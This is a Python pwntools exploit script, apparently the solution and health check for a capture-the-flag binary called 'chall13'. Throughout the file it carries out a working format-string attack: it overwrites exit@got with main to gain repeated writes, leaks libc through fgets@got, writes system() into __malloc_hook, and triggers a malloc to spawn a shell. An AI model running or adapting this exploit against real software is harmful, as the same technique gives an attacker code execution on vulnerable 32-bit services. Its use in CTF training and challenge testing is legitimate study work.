#!/usr/bin/env python3
from pwn import *
import sys

HOST = ''
PORT = 40013

NUM_ATTEMPTS = 10

target_elf = ELF('../bin/chall13')

ADDR_MAIN = 0x080485eb
ADDR_DATA = 0x0804b100

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

def put(io, addr, data):
    for i in range(0, len(data), 2):
        io.recvuntil(b': ')
        loc = p32(addr + i)
        assert(b'\x00' not in loc), 'cannot have null bytes in the address'
        io.sendline(loc + b'%' + str(u16(data[i:i+2]) - 4).encode('ascii') + b'c%7$hn___')
        io.recvuntil(b'___')

def exploit_attempt():
    try:
        if len(HOST) > 0:
            io = remote(HOST, PORT, level='warn')
            target_libc = ELF('../bin/libc.so.6')
        else:
            io = target_elf.process(level='warn')
            target_libc = target_elf.libc

        sys.stdout.write(io.recvuntil(b'5!\n'))

        # note: this exploit will use the regular __malloc_hook trigger for reliability
        #       but the quicker options would be a one shot gadget on exit() as you can
        #       control eax.
        io.recvuntil(b': ')

        # step 1: write the address of main() to exit@got.plt to get unlimited writes
        io.sendline(p32(target_elf.symbols['got.exit']) + b'%' + str((ADDR_MAIN & 0xffff) - 4).encode('ascii') + b'c%7$hn')

        # step 2: leak libc
        io.recvuntil(b': ')
        io.sendline(p32(target_elf.symbols['got.fgets']) + b'%7$s___')
        leak = io.recvuntil(b'___')
        leak = leak[4:8]
        leak = u32(leak)
        libc = leak - target_libc.symbols['_IO_fgets']

        log.info('Leak: 0x%08x' % leak)
        log.info('Libc: 0x%08x' % libc)

        # step 3: write "sh" to low memory so we can pass a param to __malloc_hook
        put(io, ADDR_DATA + 0x20, b"sh")

        # step 4: write system() to __malloc_hook()
        put(io, libc + target_libc.symbols['__malloc_hook'], p32(libc + target_libc.symbols['system']))

        # step 5: trigger __malloc_hook by passing a length specifier above 65535,
        #         in this case we will use the address of the "sh" string previously
        #         planted in order to use it as a param (there is a 32 byte overhead).
        io.recvuntil(b': ')
        io.sendline(b'%' + str(ADDR_DATA).encode('ascii'))

        # step 6: collect the shell
        io.sendline(b'id')
        id_result = io.recvline()
        if b'uid=' in id_result:
            log.success('shell: %s', id_result.decode('ascii').strip())
            if not os.environ.get('HEALTH_CHECK', False):
                io.interactive()
            return True
        else:
            log.failure('Error: %s', id_result)
    except EOFError as e:
        log.failure('Fail: EOF')
    except Exception as e:
        log.failure('Error: %s: %s', type(e), str(e))
    finally:
        io.close()
    return False

if __name__ == '__main__':
    for _ in range(NUM_ATTEMPTS):
        if exploit_attempt():
            sys.exit(0)
        sleep(0.1)
    sys.exit(1)
